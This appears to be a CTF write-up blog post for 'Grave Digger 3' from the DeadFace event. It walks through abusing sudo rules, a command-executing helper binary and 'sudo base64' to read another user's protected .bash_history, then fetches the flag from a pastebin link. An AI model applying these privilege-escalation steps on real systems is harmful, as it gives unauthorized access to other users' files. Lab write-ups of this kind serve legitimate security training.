<!DOCTYPE html>

<!--
  portfolYOU Jekyll theme by Youssef Raafat
  Free for personal and commercial use under the MIT license
  https://github.com/YoussefRaafatNasry/portfolYOU
-->

<html lang="en" class="h-100">

<head>

  
  
  

  

  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1">

  <meta property="og:type" content="website">
  <meta property="og:title" content="Grave Digger 3">
  <meta property="og:description" content="Writeup for Grave Digger 3 DeadFace CTF event.">
  <meta property="og:image" content="https://i.postimg.cc/rsy6s0b3/cf63547fadc1aa6e897a62291e0cb124.jpg">

  <title>Grave Digger 3</title>
  <meta name="description" content="Writeup for Grave Digger 3 DeadFace CTF event.">

  <link rel="shortcut icon" type="image/x-icon" href="/assets/favicon.ico">

  <!-- Theme style -->
  <script src="/assets/js/theme.js"></script>

  <!-- Font Awesome CDN -->
  <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.10.0/css/all.css">

  <!-- Bootstrap CSS CDN -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css">

  <!-- Animate CSS CDN -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.0/animate.css">

  <!-- Custom CSS -->
  <link rel="stylesheet" href="/assets/css/style.css">

</head>

<body class="h-100 d-flex flex-column">

  <main class="flex-shrink-0 container mt-5">
    <nav class="navbar navbar-expand-lg navbar-themed">

  <a class="navbar-brand" href="/"><h5><b>Activate Windows</b></h5></a>

  <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#navbarNavAltMarkup" aria-controls="navbarNavAltMarkup" aria-expanded="false" aria-label="Toggle navigation">
    <i class="fas fa-1x fa-bars text-themed"></i>
  </button>

  <div class="collapse navbar-collapse" id="navbarNavAltMarkup">
    <div class="navbar-nav ml-auto"><a class="nav-item nav-link active" href="/blog/">Blog</a>

      <a class="nav-item nav-link " href="/about/">About</a>

      <a class="nav-item nav-link " href="/timeline/">TimeLine</a>

      

      <span id="theme-toggler" class="nav-item nav-link" role="button" onclick="toggleTheme()"></span>
    </div>
  </div>

</nav>
    <div class="col-lg-10 mx-auto mt-5 markdown-body">
  <h1><b>Grave Digger 3</b></h1>

<p class="post-metadata text-muted">
  16 October 2022 -  
  <b>4 mins read time</b>

  <br>Tags: 
    
    <a class="text-decoration-none no-underline" href="/blog/tags#deadface">
      <span class="tag badge badge-pill text-primary border border-primary">DeadFace</span>
    </a>
    
    <a class="text-decoration-none no-underline" href="/blog/tags#ctf">
      <span class="tag badge badge-pill text-primary border border-primary">ctf</span>
    </a>
    </p>

<h1 id="writeup-for-grave-digger-3">Writeup for Grave Digger 3</h1>

<h2 id="description">Description</h2>

<div class="language-text highlighter-rouge"><div class="highlight"><pre class="highlight"><code>There is one more flag that DEADFACE has hidden on d34th's machine. Somehow, you'll have to find a way to access d34th's files in his home directory. Submit the flag as flag{flag text}
</code></pre></div></div>

<p>Using the same creds from Grave Digger 1 and 2, we have access to ssh with <code class="language-plaintext highlighter-rouge">crypto_vamp</code> user. Basic check for escalating privilege shows we can use a binary called <code class="language-plaintext highlighter-rouge">reader</code> in <code class="language-plaintext highlighter-rouge">/opt</code> directory as user <code class="language-plaintext highlighter-rouge">lilith</code> without password.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crypto_vamp@c81ec1737490:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-l</span>
Matching Defaults entries <span class="k">for </span>crypto_vamp on c81ec1737490:
    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin

User crypto_vamp may run the following commands on c81ec1737490:
    <span class="o">(</span>lilith<span class="o">)</span> NOPASSWD: /opt/reader
crypto_vamp@c81ec1737490:~<span class="err">$</span>
</code></pre></div></div>

<p>Looking at the man page of the <code class="language-plaintext highlighter-rouge">reader</code> binary, we can see that we can actually use <code class="language-plaintext highlighter-rouge">-c</code> flag to execute commands. Using that, we can run commands as <code class="language-plaintext highlighter-rouge">lilith</code> user.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crypto_vamp@c81ec1737490:~<span class="nv">$ </span>man reader
man<span class="o">(</span>8<span class="o">)</span>                                                                               reader man page                                                                               man<span class="o">(</span>8<span class="o">)</span>

NAME
       reader - <span class="nb">read </span>files as lilith

SYNOPSIS
       reader <span class="o">[</span>OPTIONS] <span class="o">[</span>FILENAME]

DESCRIPTION
       reader is developed to <span class="nb">help </span>crypto_vamp and other new recruits <span class="nb">read </span>privileged files <span class="k">until </span>their vetting process is complete.

OPTIONS
       <span class="nt">-f</span>, <span class="nt">--file</span> FILENAME
              Read the contents of FILENAME.

       <span class="nt">-c</span>, <span class="nt">--command</span> COMMAND
              Execute a <span class="nb">command</span> <span class="o">(</span><span class="k">for </span>troubleshooting purposes ONLY<span class="o">)</span><span class="nb">.</span>

       <span class="nt">-h</span>, <span class="nt">--help</span>
              View the <span class="nb">help </span>information.

       <span class="nt">-v</span>, <span class="nt">--version</span>
              View the version information.

       BUGS   No known bugs.

AUTHOR
       Lilith <span class="o">(</span>bl0ody_mary@deadface.io<span class="o">)</span>

1.3.1                                                                                  24 Sep 2022                                                                                 man<span class="o">(</span>8<span class="o">)</span>
crypto_vamp@c81ec1737490:~<span class="err">$</span>
</code></pre></div></div>

<p>Checking for another basic <code class="language-plaintext highlighter-rouge">sudo -l</code> from the <code class="language-plaintext highlighter-rouge">c</code> flag, we can see that we can actually run <code class="language-plaintext highlighter-rouge">/usr/bin/base64</code> as <code class="language-plaintext highlighter-rouge">root</code> on the machine without password. There’s another user called <code class="language-plaintext highlighter-rouge">spookyboi</code> whose <code class="language-plaintext highlighter-rouge">bash_history</code> doesn’t seems to be empty. So using the given <code class="language-plaintext highlighter-rouge">base64</code> binary, let’s read the history.</p>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crypto_vamp@c81ec1737490:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span> <span class="nb">sudo</span> <span class="nt">-u</span> lilith /opt/reader <span class="nt">-c</span> <span class="s2">"sudo -l"</span>
1: Matching Defaults entries <span class="k">for </span>lilith on c81ec1737490:
2:     env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sb3: <span class="k">in</span><span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
4:
5: User lilith may run the following commands on c81ec1737490:
6:     <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/base64
7:     <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /usr/bin/gzip
8:     <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: /user/bin/gunzip
crypto_vamp@c81ec1737490:~<span class="err">$</span>
</code></pre></div></div>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>crypto_vamp@c81ec1737490:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span> <span class="nb">sudo</span> <span class="nt">-u</span> lilith /opt/reader <span class="nt">-c</span> <span class="s2">"ls -al /home/spookyboi"</span>
1: total 48
2: drwxrwxr-x 1 spookyboi spookyboi 4096 Oct 13 22:50 <span class="nb">.</span>
3: drwxrwxr-x 1 root      root      4096 Oct 13 22:41 ..
4: <span class="nt">-rw-------</span> 1 spookyboi spookyboi  271 Oct 13 22:50 .bash_history
5: drwxrwxr-x 1 spookyboi spookyboi 4096 Oct 13 22:51 .keys
6: drw-rw---- 1 spookyboi spookyboi 4096 Oct 13 22:42 Desktop
7: drw-rw---- 1 spookyboi spookyboi 4096 Oct 13 22:42 Documents
8: drw-rw---- 1 spookyboi spookyboi 4096 Oct 13 22:42 Downloads
9: drw-rw---- 1 spookyboi spookyboi 4096 Oct 13 22:42 Music
10: drw-rw---- 1 spookyboi spookyboi 4096 Oct 13 22:42 Pictures
11: drw-rw---- 1 spookyboi spookyboi 4096 Oct 13 22:42 Public
12: drw-rw---- 1 spookyboi spookyboi 4096 Oct 13 22:42 Templates
13: drw-rw---- 1 spookyboi spookyboi 4096 Oct 13 22:42 Videos
crypto_vamp@c81ec1737490:~<span class="nv">$ </span><span class="nb">sudo</span> <span class="nt">-u</span> <span class="nb">sudo</span> <span class="nt">-u</span> lilith /opt/reader <span class="nt">-c</span> <span class="s2">"sudo /usr/bin/base64 /home/spookyboi/.bash_history | base64 -d"</span>
1: <span class="nb">ls</span> <span class="nt">-l</span>
2: <span class="nb">cd</span> ~
3: <span class="nb">mkdir </span>docs
4: <span class="nb">rm</span> <span class="nt">-rf</span> docs
5: wget https://pastebin.com/raw/XX2nkn3W <span class="o">&gt;</span> gravedigger3.txt
6: <span class="nb">rm </span>gravedigger3.txt
7: openssl genrsa <span class="nt">-aes128</span> <span class="nt">-out</span> spookyboi-priv.pem 1024
8: openssl rsa <span class="nt">-in</span> spookyboi-priv.pem  <span class="nt">-pubout</span> <span class="o">&gt;</span> spookyboi-public.pem
9: <span class="nb">rm </span>spookyboi-public.pem
10: <span class="nb">mv</span> <span class="k">*</span>.pem .keys/
crypto_vamp@c81ec1737490:~<span class="err">$</span>
</code></pre></div></div>

<h1 id="flag">Flag</h1>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>» wget https://pastebin.com/raw/XX2nkn3W
<span class="nt">--2022-10-17</span> 17:42:07--  https://pastebin.com/raw/XX2nkn3W
Resolving pastebin.com <span class="o">(</span>pastebin.com<span class="o">)</span>... 172.67.34.170, 104.20.67.143, 104.20.68.143, ...
Connecting to pastebin.com <span class="o">(</span>pastebin.com<span class="o">)</span>|172.67.34.170|:443... connected.
HTTP request sent, awaiting response... 200 OK
Length: unspecified <span class="o">[</span>text/plain]
Saving to: ‘XX2nkn3W’

XX2nkn3W                                            <span class="o">[</span> &lt;<span class="o">=&gt;</span>                                                                                                  <span class="o">]</span>      17  <span class="nt">--</span>.-KB/s    <span class="k">in </span>0s

2022-10-17 17:42:07 <span class="o">(</span>3.42 MB/s<span class="o">)</span> - ‘XX2nkn3W’ saved <span class="o">[</span>17]

» <span class="nb">cat </span>XX2nkn3W
flag<span class="o">{</span>b4d_h1sTOrY<span class="o">}</span>
</code></pre></div></div>

<h5 id="author-avijneyam">Author: <a href="https://twitter.com/avijneyam">Avijneyam</a></h5>



</div>
  </main>
  <footer class="mt-auto py-3 text-center">

  <small class="text-muted mb-2">
    <i class="fas fa-code"></i> with <i class="fas fa-heart"></i>
    by <strong>Activate Windows</strong>
  </small>

  <div class="container-fluid justify-content-center"><a class="social mx-1"  href="mailto:ActivateWind0ws@protonmail.com"
       style="color: #6c757d"
       onMouseOver="this.style.color='#db4437'"
       onMouseOut="this.style.color='#6c757d'">
      <i class="fas fa-envelope fa-1x"></i>
    </a><a class="social mx-1"  href="https://github.com/ActivateWind0ws"
       style="color: #6c757d"
       onMouseOver="this.style.color='#333333'"
       onMouseOut="this.style.color='#6c757d'">
      <i class="fab fa-github fa-1x"></i>
    </a>

</div><small id="attribution">
    theme <a href="https://github.com/YoussefRaafatNasry/portfolYOU">portfolYOU</a>
  </small>

</footer>

  
  <!-- GitHub Buttons -->
<script async defer src="https://buttons.github.io/buttons.js"></script>

<!-- jQuery CDN -->
<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>

<!-- Popper.js CDN -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.14.6/umd/popper.min.js"></script>

<!-- Bootstrap JS CDN -->
<script src="https://stackpath.bootstrapcdn.com/bootstrap/4.3.1/js/bootstrap.min.js"></script>

<!-- wow.js CDN & Activation -->
<script src="https://cdnjs.cloudflare.com/ajax/libs/wow/1.1.2/wow.js"></script>
<script> new WOW().init(); </script>

<!-- Initialize all tooltips -->
<script>
$(function () {
    $('[data-toggle="tooltip"]').tooltip()
})
</script>
</body>

</html>